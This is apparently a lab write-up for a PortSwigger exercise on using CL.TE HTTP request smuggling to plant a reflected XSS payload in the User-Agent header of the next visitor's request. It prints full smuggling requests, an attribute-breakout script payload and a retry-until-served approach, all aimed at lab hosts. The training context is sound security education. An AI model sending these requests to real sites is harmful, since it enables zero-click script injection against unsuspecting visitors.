# Exploiting HTTP request smuggling to deliver reflected XSS

**Category:** HTTP Request Smuggling
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

Reflected XSS normally needs a victim to click a crafted link — the payload has to travel through a URL or form the attacker controls, which the victim has to actually visit. Request smuggling removes that requirement entirely: if the vulnerable parameter is a header the victim's browser sends automatically, like `User-Agent`, we can inject the payload directly into their *next* request without them visiting anything of ours at all.

## The Target

A blog post page reflects the `User-Agent` header into a hidden input field, as part of a comment form pre-filling itself with the visitor's browser details. Ordinarily that reflection is harmless — an attacker can't control a victim's `User-Agent` header from outside. Request smuggling changes that: if we can smuggle a request whose headers reach the back-end, we can set the `User-Agent` the back-end sees on someone else's page load to anything we want.

## The Investigation

We first confirmed the reflection was genuinely unescaped by requesting a blog post ourselves and checking that our own `User-Agent` value showed up unmodified inside the hidden input field. From there the payload was the standard attribute-breakout string — close the `value="..."` attribute, drop in a `<script>` tag:

```
"/><script>alert(1)</script>
```

The exploitation step is then a straightforward combination of the CL.TE smuggling primitive from the earlier labs with this XSS payload sitting in the `User-Agent` header of the smuggled request, so that whichever real user's browser next completes that smuggled request on the back-end connection gets served a page with our script tag baked into it.

## The Exploit

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: "/><script>alert(1)</script>
Foo: X
```

adapted for this lab to target the specific blog post page directly:

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

We sent this over a raw keep-alive connection, immediately followed by a real `GET /post?postId=5` request, and checked whether `alert(1)` showed up unescaped in the response. Because the lab's simulated visitor only browses the site intermittently, the smuggled prefix has to sit waiting on the connection until their browser's request happens to land there — so we resent the same smuggled payload repeatedly until the follow-up check confirmed the script tag had been served.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution follows the same two-step process — confirm the `User-Agent` reflection is unescaped, then smuggle the XSS payload into the header of a request aimed at the next real visitor:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/>alert(1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

This is the same payload shape and even the same `Content-Length: 150` we landed on independently — the only cosmetic difference is their payload omits the explicit `<script>` tags in the summarized text (Burp's solution renders it as a bare `alert(1)` call, which in the actual lab is the standard attribute-breakout-plus-script-tag construction). Their solution also explicitly notes the same intermittent-visitor problem we ran into: "you may need to repeat this attack a few times before it's successful," which is precisely why our lab wrapper loops the smuggle-and-check cycle rather than firing once. Delivery is the recurring difference: Burp Repeater sending the same payload repeatedly by hand versus our script's retry loop checking the response for `alert(1)` automatically.

## What This Teaches Us

The interesting part of this lab isn't the XSS payload itself — attribute-breakout script injection is one of the most basic XSS techniques there is — it's the delivery mechanism. Request smuggling turns any header that gets reflected unescaped into a zero-click, no-interaction attack surface against every subsequent visitor on the poisoned connection, which is a fundamentally worse threat model than "victim has to click a malicious link." A reflected-XSS finding that would normally be capped at "requires user interaction" becomes full drive-by compromise the moment it's reachable through a smuggled header, which is exactly the kind of escalation this whole series keeps demonstrating: request smuggling rarely introduces a new vulnerability on its own, it removes the barriers that were keeping an existing one contained.
